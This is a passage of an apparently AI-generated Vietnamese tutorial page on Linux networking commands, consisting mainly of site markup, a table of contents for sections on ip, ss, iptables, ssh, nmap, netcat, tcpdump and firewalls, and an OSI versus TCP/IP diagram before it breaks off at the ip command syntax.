<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=vi><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=2"><meta name=robots content="noodp"><title>Linux Network Commands - Hướng Dẫn Chuyên Sâu - Kaizen - tốt hơn mỗi ngày</title><meta name=author content="Kaizen Teams"><meta name=description content="Linux Network Commands - Hướng Dẫn Chuyên Sâu"><meta name=keywords content='ai generated post'><meta itemprop=name content="Linux Network Commands - Hướng Dẫn Chuyên Sâu"><meta itemprop=description content="Linux Network Commands - Hướng Dẫn Chuyên Sâu"><meta itemprop=datePublished content="2025-12-10T10:17:23+07:00"><meta itemprop=dateModified content="2025-12-13T07:26:59+07:00"><meta itemprop=wordCount content="12011"><meta itemprop=keywords content="Ai Generated Post"><meta property="og:url" content="https://vanvuvuong.github.io/bai-viet/khoa-hoc-may-tinh/linux-cli/network/"><meta property="og:site_name" content="Kaizen - tốt hơn mỗi ngày"><meta property="og:title" content="Linux Network Commands - Hướng Dẫn Chuyên Sâu"><meta property="og:description" content="Linux Network Commands - Hướng Dẫn Chuyên Sâu"><meta property="og:locale" content="vi"><meta property="og:type" content="article"><meta property="article:section" content="bai-viet"><meta property="article:published_time" content="2025-12-10T10:17:23+07:00"><meta property="article:modified_time" content="2025-12-13T07:26:59+07:00"><meta property="article:tag" content="Ai Generated Post"><meta name=twitter:card content="summary"><meta name=twitter:title content="Linux Network Commands - Hướng Dẫn Chuyên Sâu"><meta name=twitter:description content="Linux Network Commands - Hướng Dẫn Chuyên Sâu"><meta name=application-name content="Kaizen - tốt hơn mỗi ngày"><meta name=apple-mobile-web-app-title content="Kaizen - tốt hơn mỗi ngày"><meta name=theme-color data-light=#f8f8f8 data-dark=#252627 content="#f8f8f8"><meta name=msapplication-TileColor content="#2d89ef"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#FF7359><link rel=manifest href=/site.webmanifest><link rel=canonical type=text/html href=https://vanvuvuong.github.io/bai-viet/khoa-hoc-may-tinh/linux-cli/network/ title="Linux Network Commands - Hướng Dẫn Chuyên Sâu - Kaizen - tốt hơn mỗi ngày"><link rel=prev type=text/html href=https://vanvuvuong.github.io/bai-viet/khoa-hoc-may-tinh/linux-cli/grep-diff-sort/ title="Grep, Sort, Diff - Hướng Dẫn Chuyên Sâu"><link rel=next type=text/html href=https://vanvuvuong.github.io/bai-viet/khoa-hoc-may-tinh/linux-cli/process-service-log/ title="Process Management, Systemd & Logging - Hướng Dẫn Chuyên Sâu"><link rel=stylesheet href=/css/config.min.css><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Linux Network Commands - Hướng Dẫn Chuyên Sâu","inLanguage":"vi","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/vanvuvuong.github.io\/bai-viet\/khoa-hoc-may-tinh\/linux-cli\/network\/"},"image":[{"@type":"ImageObject","url":"https:\/\/vanvuvuong.github.io\/images\/avatar.jpeg","width":330,"height":330}],"genre":"posts","keywords":"ai generated post","wordcount":12011,"url":"https:\/\/vanvuvuong.github.io\/bai-viet\/khoa-hoc-may-tinh\/linux-cli\/network\/","datePublished":"2025-12-10T10:17:23+07:00","dateModified":"2025-12-13T07:26:59+07:00","publisher":{"@type":"Organization","name":"Kaizen","logo":{"@type":"ImageObject","url":"https:\/\/vanvuvuong.github.io\/images\/avatar.jpeg","width":330,"height":330}},"author":{"@type":"Person","name":"Kaizen Teams"},"description":"Linux Network Commands - Hướng Dẫn Chuyên Sâu"}</script><script src=/js/head/color-scheme.min.js></script></head><body data-instant-intensity=viewport data-header-desktop=sticky data-header-mobile=auto><div class=wrapper data-page-style=normal><header class="desktop animate__faster" id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Kaizen - tốt hơn mỗi ngày"><img class=logo src=/images/kaizen-logo.png alt="Kaizen - tốt hơn mỗi ngày" height=32 width=32><span class=header-title-text>Kaizen</span></a><span class=header-subtitle></span></div><nav><ul class=menu><li class=menu-item><a class=menu-link href=/gioi-thieu><i class="fa-solid fa-comments fa-fw fa-sm" aria-hidden=true></i> Giới thiệu</a></li><li class="menu-item has-children"><a class=menu-link href=/bai-viet><i class="fa-solid fa-newspaper fa-fw fa-sm" aria-hidden=true></i> Bài viết</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden=true></i><ul class=sub-menu><li class=menu-item><a class=menu-link href=/bai-viet/khoa-hoc-may-tinh><i class="fa-solid fa-laptop fa-fw fa-sm" aria-hidden=true></i> Khoa học máy tính</a></li><li class=menu-item><a class=menu-link href=/bai-viet/cuoc-song><i class="fa-solid fa-life-ring fa-fw fa-sm" aria-hidden=true></i> Cuộc sống</a></li><li class=menu-item><a class=menu-link href=/bai-viet/hoc-vien-luat-tu-nhien><i class="fa-solid fa-dragon fa-fw fa-sm" aria-hidden=true></i> Học viện luật tự nhiên</a></li><li class=menu-item><a class=menu-link href=/collections><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden=true></i> Bộ sưu tập</a></li><li class=menu-item><a class=menu-link href=/tags><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> Tags</a></li></ul></li><li class=menu-item><a class=menu-link href=/sach-hay><i class="fa-solid fa-book fa-fw fa-sm" aria-hidden=true></i> Sách hay</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id=search-desktop><input type=text placeholder="Tìm tiêu đề hoặc nội dung..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title="Tìm kiếm"><i class="fa-solid fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Xoá><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-desktop><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></li><li class="menu-item theme-switch" title="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></li></ul></nav></div></header><header class="mobile animate__faster" id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Kaizen - tốt hơn mỗi ngày"><img class=logo src=/images/kaizen-logo.png alt="Kaizen - tốt hơn mỗi ngày" height=26 width=26><span class=header-title-text>Kaizen</span></a><span class=header-subtitle></span></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><nav><ul class=menu id=menu-mobile><li class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Tìm tiêu đề hoặc nội dung..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title="Tìm kiếm"><i class="fa-solid fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Xoá><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-mobile><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Huỷ</a></li><li class=menu-item><a class=menu-link href=/gioi-thieu><i class="fa-solid fa-comments fa-fw fa-sm" aria-hidden=true></i> Giới thiệu</a></li><li class=menu-item><span class=nested-item><a class=menu-link href=/bai-viet><i class="fa-solid fa-newspaper fa-fw fa-sm" aria-hidden=true></i> Bài viết</a>
<i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden=true></i></span><ul class=sub-menu><li class=menu-item><a class=menu-link href=/bai-viet/khoa-hoc-may-tinh><i class="fa-solid fa-laptop fa-fw fa-sm" aria-hidden=true></i> Khoa học máy tính</a></li><li class=menu-item><a class=menu-link href=/bai-viet/cuoc-song><i class="fa-solid fa-life-ring fa-fw fa-sm" aria-hidden=true></i> Cuộc sống</a></li><li class=menu-item><a class=menu-link href=/bai-viet/hoc-vien-luat-tu-nhien><i class="fa-solid fa-dragon fa-fw fa-sm" aria-hidden=true></i> Học viện luật tự nhiên</a></li><li class=menu-item><a class=menu-link href=/collections><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden=true></i> Bộ sưu tập</a></li><li class=menu-item><a class=menu-link href=/tags><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> Tags</a></li></ul></li><li class=menu-item><a class=menu-link href=/sach-hay><i class="fa-solid fa-book fa-fw fa-sm" aria-hidden=true></i> Sách hay</a></li><li class="menu-item menu-system"><span class="menu-system-item theme-switch" title="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></span></li></ul></nav></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=fi-container><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Bộ sưu tập"><div class="details collection-details open"><div class="details-summary collection-summary"><i class="fa-solid fa-layer-group fa-fw" aria-hidden=true></i>
<span class=collection-name title="Bộ sưu tập">Linux Cli</span>
<span class=collection-count>11</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class="details-content collection-content"><nav><ul class=collection-list><li class=collection-item><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/shell-co-ban/ title="Những Điều Cơ Bản Về Bash & Fish Shell Trong Linux">Những Điều Cơ Bản Về Bash & Fish Shell Trong Linux</a></li><li class=collection-item><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/grep-diff-sort/ title="Grep, Sort, Diff - Hướng Dẫn Chuyên Sâu">Grep, Sort, Diff - Hướng Dẫn Chuyên Sâu</a></li><li class=collection-item><span class=active title="Linux Network Commands - Hướng Dẫn Chuyên Sâu">Linux Network Commands - Hướng Dẫn Chuyên Sâu</span></li><li class=collection-item><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/process-service-log/ title="Process Management, Systemd & Logging - Hướng Dẫn Chuyên Sâu">Process Management, Systemd & Logging - Hướng Dẫn Chuyên Sâu</a></li><li class=collection-item><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/regex-awk-sed/ title="Awk, Sed & Regex - Hướng Dẫn Chuyên Sâu Cho System Engineer">Awk, Sed & Regex - Hướng Dẫn Chuyên Sâu Cho System Engineer</a></li><li class=collection-item><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/storage/ title="Disk, Storage & Filesystem - Hướng Dẫn Chuyên Sâu">Disk, Storage & Filesystem - Hướng Dẫn Chuyên Sâu</a></li><li class=collection-item><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/user-group/ title="Linux User & Group Management - Hướng Dẫn Chuyên Sâu">Linux User & Group Management - Hướng Dẫn Chuyên Sâu</a></li><li class=collection-item><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/encryption-and-security/ title="Linux Cryptography & Security Tools - Hướng Dẫn Chuyên Sâu">Linux Cryptography & Security Tools - Hướng Dẫn Chuyên Sâu</a></li><li class=collection-item><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/package-manager/ title="Linux Package Management - Hướng Dẫn Chuyên Sâu">Linux Package Management - Hướng Dẫn Chuyên Sâu</a></li><li class=collection-item><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/selinux/ title="Selinux & Apparmor - Kiểm Soát Truy Cập Bắt Buộc">Selinux & Apparmor - Kiểm Soát Truy Cập Bắt Buộc</a></li><li class=collection-item><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/file-and-folder/ title="Find, Ln, Lsof, Tar, Chmod - Hướng Dẫn Chuyên Sâu">Find, Ln, Lsof, Tar, Chmod - Hướng Dẫn Chuyên Sâu</a></li></ul><div class=collection-nav-simple><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/grep-diff-sort/ class=collection-nav-item rel=prev title="Grep, Sort, Diff - Hướng Dẫn Chuyên Sâu"><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i></a><span class=text-secondary>3/11</span><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/process-service-log/ class=collection-nav-item rel=next title="Process Management, Systemd & Logging - Hướng Dẫn Chuyên Sâu"><i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></nav></div></div><div class="details related-details open"><div class="details-summary related-summary"><i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden=true></i>
<span class=related-title>Nội dung liên quan</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class="details-content related-content"><ul class=related-list><li class=related-item><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/grep-diff-sort/ title="Grep, Sort, Diff - Hướng Dẫn Chuyên Sâu">Grep, Sort, Diff - Hướng Dẫn Chuyên Sâu</a></li><li class=related-item><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/shell-co-ban/ title="Những Điều Cơ Bản Về Bash & Fish Shell Trong Linux">Những Điều Cơ Bản Về Bash & Fish Shell Trong Linux</a></li></ul></div></div></aside><article class="page single"><div class=header><h1 class="single-title animate__animated animate__flipInX"><span>Linux Network Commands - Hướng Dẫn Chuyên Sâu</span></h1></div><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://vanvuvuong.github.io title="Tác giả" target=_blank rel="external nofollow noopener noreferrer author" class=author><i class="fa-solid fa-user-circle" aria-hidden=true></i>
Kaizen Teams</a></span><span class=post-included-in>&nbsp;trong <a href=/collections/linux-cli/ class=post-collection title="Bộ sưu tập - Linux Cli"><i class="fa-solid fa-layer-group fa-fw" aria-hidden=true></i> Linux Cli</a></span></div><div class=post-meta-line><span title="đăng ngày 2025-12-10 10:17:23"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden=true></i><time datetime=2025-12-10>2025-12-10</time></span>&nbsp;<span title="Cập nhật ngày 2025-12-13 07:26:59"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden=true></i><time datetime=2025-12-13>2025-12-13</time></span>&nbsp;<span title="12011 từ"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden=true></i>Khoảng 12100 từ</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden=true></i>57 phút</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept=false><div class="details-summary toc-title"><span>Nội dung</span>
<span><i class="details-icon fa-solid fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><ul><li><a href=#phần-1-ip---quản-lý-network-interface>PHẦN 1: IP - QUẢN LÝ NETWORK INTERFACE</a><ul><li><a href=#11-kiến-trúc-network-stack>1.1 Kiến Trúc Network Stack</a></li><li><a href=#12-cú-pháp-ip-command>1.2 Cú Pháp ip Command</a></li></ul></li></ul></li><li><a href=#object-chính>OBJECT chính:</a></li><li><a href=#options-hay-dùng>OPTIONS hay dùng:</a><ul><li><ul><li><a href=#14-ip-addr---quản-lý-ip-address>1.4 ip addr - Quản Lý IP Address</a></li><li><a href=#15-ip-route---routing-table>1.5 ip route - Routing Table</a></li><li><a href=#16-ip-neigh---arp-cache>1.6 ip neigh - ARP Cache</a></li><li><a href=#17-network-namespaces>1.7 Network Namespaces</a></li></ul></li><li><a href=#phần-2-ssnetstat---socket-statistics>PHẦN 2: SS/NETSTAT - SOCKET STATISTICS</a><ul><li><a href=#21-tcp-connection-states>2.1 TCP Connection States</a></li><li><a href=#22-ss-vs-netstat>2.2 ss vs netstat</a></li><li><a href=#23-cú-pháp-ss>2.3 Cú Pháp ss</a></li><li><a href=#24-các-lệnh-hay-dùng>2.4 Các Lệnh Hay Dùng</a></li><li><a href=#25-filtering>2.5 Filtering</a></li><li><a href=#26-monitoring-use-cases>2.6 Monitoring Use Cases</a></li></ul></li><li><a href=#phần-3-iptables---firewall>PHẦN 3: IPTABLES - FIREWALL</a><ul><li><a href=#31-netfilter-architecture>3.1 Netfilter Architecture</a></li><li><a href=#32-rule-processing-algorithm>3.2 Rule Processing Algorithm</a></li><li><a href=#33-cú-pháp-cơ-bản>3.3 Cú Pháp Cơ Bản</a></li><li><a href=#34-targets-actions>3.4 Targets (Actions)</a></li><li><a href=#35-match-extensions>3.5 Match Extensions</a></li><li><a href=#36-stateful-firewall>3.6 Stateful Firewall</a></li><li><a href=#37-nat-network-address-translation>3.7 NAT (Network Address Translation)</a></li><li><a href=#38-ví-dụ-thực-tế>3.8 Ví Dụ Thực Tế</a></li><li><a href=#39-ipset---efficient-ip-lists>3.9 ipset - Efficient IP Lists</a></li></ul></li><li><a href=#phần-4-ssh---secure-shell>PHẦN 4: SSH - SECURE SHELL</a><ul><li><a href=#41-ssh-architecture>4.1 SSH Architecture</a></li><li><a href=#42-key-based-authentication>4.2 Key-Based Authentication</a></li><li><a href=#43-ssh-config-file>4.3 SSH Config File</a></li><li><a href=#44-port-forwarding-tunneling>4.4 Port Forwarding (Tunneling)</a></li><li><a href=#45-scp-và-sftp>4.5 SCP và SFTP</a></li><li><a href=#46-security-best-practices>4.6 Security Best Practices</a></li></ul></li><li><a href=#phần-5-rsync---remote-sync>PHẦN 5: RSYNC - REMOTE SYNC</a><ul><li><a href=#51-delta-algorithm>5.1 Delta Algorithm</a></li><li><a href=#52-cú-pháp-cơ-bản>5.2 Cú Pháp Cơ Bản</a></li><li><a href=#53-options-quan-trọng>5.3 Options Quan Trọng</a></li><li><a href=#54-ví-dụ-thực-tế>5.4 Ví Dụ Thực Tế</a></li><li><a href=#55-backup-strategy-với-rsync>5.5 Backup Strategy với Rsync</a></li></ul></li><li><a href=#phần-6-curl--wget>PHẦN 6: CURL & WGET</a><ul><li><a href=#61-curl---http-swiss-army-knife>6.1 Curl - HTTP Swiss Army Knife</a></li><li><a href=#62-wget---download-manager>6.2 Wget - Download Manager</a></li><li><a href=#63-curl-vs-wget>6.3 Curl vs Wget</a></li></ul></li><li><a href=#phần-7-nmap--nc-netcat>PHẦN 7: NMAP & NC (NETCAT)</a><ul><li><a href=#71-nmap---network-mapper>7.1 Nmap - Network Mapper</a></li><li><a href=#72-netcat-nc---tcpudp-swiss-army-knife>7.2 Netcat (nc) - TCP/UDP Swiss Army Knife</a></li></ul></li><li><a href=#phần-8-dns--network-diagnostics>PHẦN 8: DNS & NETWORK DIAGNOSTICS</a><ul><li><a href=#81-dns-resolution>8.1 DNS Resolution</a></li><li><a href=#82-dig---dns-query-tool>8.2 dig - DNS Query Tool</a></li><li><a href=#83-nslookup>8.3 nslookup</a></li><li><a href=#84-ping--traceroute>8.4 Ping & Traceroute</a></li></ul></li><li><a href=#phần-9-file-transfer-scp-sftp-ftp>PHẦN 9: FILE TRANSFER (SCP, SFTP, FTP)</a><ul><li><a href=#91-so-sánh>9.1 So Sánh</a></li><li><a href=#92-scp>9.2 SCP</a></li><li><a href=#93-sftp>9.3 SFTP</a></li></ul></li><li><a href=#phần-10-networkmanager--nmcli>PHẦN 10: NETWORKMANAGER & NMCLI</a><ul><li><a href=#101-networkmanager-architecture>10.1 NetworkManager Architecture</a></li><li><a href=#102-nmcli-cú-pháp>10.2 nmcli Cú Pháp</a></li><li><a href=#103-xem-trạng-thái>10.3 Xem Trạng Thái</a></li><li><a href=#104-quản-lý-connections>10.4 Quản Lý Connections</a></li><li><a href=#105-quản-lý-devices>10.5 Quản Lý Devices</a></li><li><a href=#106-advanced-bonding-bridge-vlan>10.6 Advanced: Bonding, Bridge, VLAN</a></li><li><a href=#107-troubleshooting>10.7 Troubleshooting</a></li></ul></li><li><a href=#phần-11-dns-resolution---resolvectl--resolvconf>PHẦN 11: DNS RESOLUTION - RESOLVECTL & RESOLVCONF</a><ul><li><a href=#111-dns-resolution-architecture>11.1 DNS Resolution Architecture</a></li><li><a href=#112-etcresolvconf-traditional>11.2 /etc/resolv.conf (Traditional)</a></li><li><a href=#113-resolvconf-legacy-wrapper>11.3 resolvconf (Legacy Wrapper)</a></li><li><a href=#114-systemd-resolved--resolvectl>11.4 systemd-resolved & resolvectl</a></li><li><a href=#115-systemd-resolved-configuration>11.5 systemd-resolved Configuration</a></li><li><a href=#116-dns-over-tls-dot-với-systemd-resolved>11.6 DNS-over-TLS (DoT) với systemd-resolved</a></li></ul></li><li><a href=#phần-12-tcpdump---packet-capture>PHẦN 12: TCPDUMP - PACKET CAPTURE</a><ul><li><a href=#121-packet-capture-fundamentals>12.1 Packet Capture Fundamentals</a></li><li><a href=#122-tcpdump-cú-pháp>12.2 tcpdump Cú Pháp</a></li><li><a href=#123-filter-expressions>12.3 Filter Expressions</a></li><li><a href=#124-practical-examples>12.4 Practical Examples</a></li><li><a href=#125-output-analysis>12.5 Output Analysis</a></li><li><a href=#126-performance-considerations>12.6 Performance Considerations</a></li></ul></li><li><a href=#phần-13-modern-firewalls---firewalld--ufw>PHẦN 13: MODERN FIREWALLS - FIREWALLD & UFW</a><ul><li><a href=#131-iptables-vs-nftables-vs-firewalldufw>13.1 iptables vs nftables vs firewalld/ufw</a></li><li><a href=#132-firewalld-rhelcentosfedora>13.2 firewalld (RHEL/CentOS/Fedora)</a></li><li><a href=#133-ufw-ubuntudebian>13.3 ufw (Ubuntu/Debian)</a></li><li><a href=#134-ufw-application-profiles>13.4 ufw Application Profiles</a></li></ul></li><li><a href=#phần-14-ethtool---nic-configuration>PHẦN 14: ETHTOOL - NIC CONFIGURATION</a><ul><li><a href=#141-nic-information>14.1 NIC Information</a></li><li><a href=#142-nic-configuration>14.2 NIC Configuration</a></li></ul></li><li><a href=#phần-15-tc---traffic-control>PHẦN 15: TC - TRAFFIC CONTROL</a><ul><li><a href=#151-traffic-control-concepts>15.1 Traffic Control Concepts</a></li><li><a href=#152-rate-limiting-với-tbf>15.2 Rate Limiting với tbf</a></li><li><a href=#153-network-emulation-với-netem>15.3 Network Emulation với netem</a></li></ul></li><li><a href=#phần-16-wireless---iw-iwconfig-deprecated>PHẦN 16: WIRELESS - IW (iwconfig DEPRECATED)</a><ul><li><a href=#161-iw-vs-iwconfig>16.1 iw vs iwconfig</a></li><li><a href=#162-wireless-information>16.2 Wireless Information</a></li><li><a href=#163-basic-operations>16.3 Basic Operations</a></li></ul></li><li><a href=#phần-17-legacy-commands-reference>PHẦN 17: LEGACY COMMANDS REFERENCE</a><ul><li><a href=#171-ifconfig-deprecated--ip>17.1 ifconfig (DEPRECATED → ip)</a></li><li><a href=#172-route-deprecated--ip-route>17.2 route (DEPRECATED → ip route)</a></li><li><a href=#173-netstat-deprecated--ss>17.3 netstat (DEPRECATED → ss)</a></li><li><a href=#174-arp-deprecated--ip-neigh>17.4 arp (DEPRECATED → ip neigh)</a></li><li><a href=#175-iwconfig-deprecated--iw>17.5 iwconfig (DEPRECATED → iw)</a></li><li><a href=#176-summary-legacy--modern>17.6 Summary: Legacy → Modern</a></li></ul></li><li><a href=#tóm-tắt-nhanh>TÓM TẮT NHANH</a><ul><li><a href=#ip>ip</a></li><li><a href=#ssnetstat>ss/netstat</a></li><li><a href=#iptables>iptables</a></li><li><a href=#ssh>ssh</a></li><li><a href=#rsync>rsync</a></li><li><a href=#curl>curl</a></li><li><a href=#nmap>nmap</a></li><li><a href=#nc-netcat>nc (netcat)</a></li><li><a href=#digpingtraceroute>dig/ping/traceroute</a></li><li><a href=#nmcli>nmcli</a></li><li><a href=#resolvectl>resolvectl</a></li><li><a href=#tcpdump>tcpdump</a></li><li><a href=#firewall-cmd-rhelcentos>firewall-cmd (RHEL/CentOS)</a></li><li><a href=#ufw-ubuntu>ufw (Ubuntu)</a></li><li><a href=#ethtool>ethtool</a></li><li><a href=#tc-traffic-control>tc (traffic control)</a></li><li><a href=#iw-wireless>iw (wireless)</a></li></ul></li></ul></li></ul></nav></div></div><div class=content id=content><h2 class=heading-element id=phần-1-ip---quản-lý-network-interface><span>PHẦN 1: IP - QUẢN LÝ NETWORK INTERFACE</span>
<a href=#ph%e1%ba%a7n-1-ip---qu%e1%ba%a3n-l%c3%bd-network-interface class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=11-kiến-trúc-network-stack><span>1.1 Kiến Trúc Network Stack</span>
<a href=#11-ki%e1%ba%bfn-tr%c3%bac-network-stack class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                   OSI MODEL vs TCP/IP                       │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    OSI Model              TCP/IP Model         Linux Tools
</span></span><span class=line><span class=cl>┌───────────────┐      ┌───────────────┐
</span></span><span class=line><span class=cl>│ 7.Application │      │               │      curl, wget, dig
</span></span><span class=line><span class=cl>├───────────────┤      │  Application  │
</span></span><span class=line><span class=cl>│ 6.Presentation│      │               │
</span></span><span class=line><span class=cl>├───────────────┤      │               │
</span></span><span class=line><span class=cl>│ 5.Session     │      ├───────────────┤
</span></span><span class=line><span class=cl>├───────────────┤      │   Transport   │      ss, netstat, nc
</span></span><span class=line><span class=cl>│ 4.Transport   │      │   (TCP/UDP)   │
</span></span><span class=line><span class=cl>├───────────────┤      ├───────────────┤
</span></span><span class=line><span class=cl>│ 3.Network     │      │   Internet    │      ip, ping, traceroute
</span></span><span class=line><span class=cl>│               │      │   (IP)        │      iptables, nmap
</span></span><span class=line><span class=cl>├───────────────┤      ├───────────────┤
</span></span><span class=line><span class=cl>│ 2.Data Link   │      │   Network     │      ip link, arp
</span></span><span class=line><span class=cl>├───────────────┤      │   Access      │
</span></span><span class=line><span class=cl>│ 1.Physical    │      │               │
</span></span><span class=line><span class=cl>└───────────────┘      └───────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Packet đi xuống: Encapsulation (thêm header)
</span></span><span class=line><span class=cl>Packet đi lên: Decapsulation (bóc header)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌──────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│ Ethernet Header │ IP Header │ TCP Header │ HTTP Data     │
</span></span><span class=line><span class=cl>│    (14 bytes)   │ (20 bytes)│ (20 bytes) │ (variable)    │
</span></span><span class=line><span class=cl>└──────────────────────────────────────────────────────────┘</span></span></code></pre></div><h3 class=heading-element id=12-cú-pháp-ip-command><span>1.2 Cú Pháp ip Command</span>
<a href=#12-c%c3%ba-ph%c3%a1p-ip-command class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>markdownbash
ip [OPTIONS] OBJECT COMMAND</p><h1 class=heading-element id=object-chính><span>OBJECT chính:</span>
